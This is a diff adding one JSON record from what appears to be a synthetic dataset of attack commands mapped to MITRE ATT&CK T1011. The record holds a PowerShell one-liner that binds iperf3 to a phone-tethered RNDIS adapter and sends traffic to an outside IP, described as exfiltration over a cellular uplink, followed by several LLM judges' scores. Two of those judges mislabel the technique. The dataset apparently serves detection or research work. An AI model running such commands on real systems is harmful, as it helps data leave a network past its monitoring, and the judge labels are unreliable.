@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=Get-NetAdapter | Where-Object {$_.InterfaceDescription -like '*Remote NDIS based Internet Sharing Device*'}; if($usb){$ip=(Get-NetIPAddress -InterfaceIndex $usb.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c 104.87.215.11 -p 61111 -B $ip -u -t 35}",
+  "explanation": "Targets a USB\u2011tethered RNDIS interface (smartphone tether) and binds iperf3 to it, exfiltrating over the phone\u2019s cellular uplink (alternate medium) as per T1011.",
+  "rationale_steps": [
+    "Locate the USB RNDIS network adapter from a tethered phone.",
+    "Determine its IPv4 address for binding.",
+    "Run iperf3 UDP client on a high port bound to the RNDIS interface.",
+    "Leverage the phone\u2019s cellular path to bypass the primary network."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-c0a371f5",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable assignment, pipeline operations, conditional logic, balanced parentheses/braces, and correct cmdlet syntax throughout.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command correctly identifies a USB-tethered RNDIS interface and attempts to use iperf3 for data transfer, it doesn't align with T1011 (Exfiltration Over Other Network Medium) rather than T1011 (Modify System Image) as specified in the technique description.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T17:09:47.282582Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct Powershell syntax, balanced constructs, and valid flag formats for all components.",
+        "semantic_score": 0,
+        "semantic_justification": "The command identifies a network adapter and performs data exfiltration using iperf3, which has no semantic relation to MITRE ATT&CK T1011 (Modify System Image).",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T17:09:55.207140Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced braces, proper separators, valid cmdlet/parameter usage, and plausible iperf3 flags.",
+        "semantic_score": 4,
+        "semantic_justification": "It identifies a USB RNDIS interface, binds iperf3 to its IPv4 address, and sends UDP traffic to a remote host over that alternate medium, though iperf3 generates synthetic data and multiple addresses could cause edge-case issues.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T17:10:34.769105Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
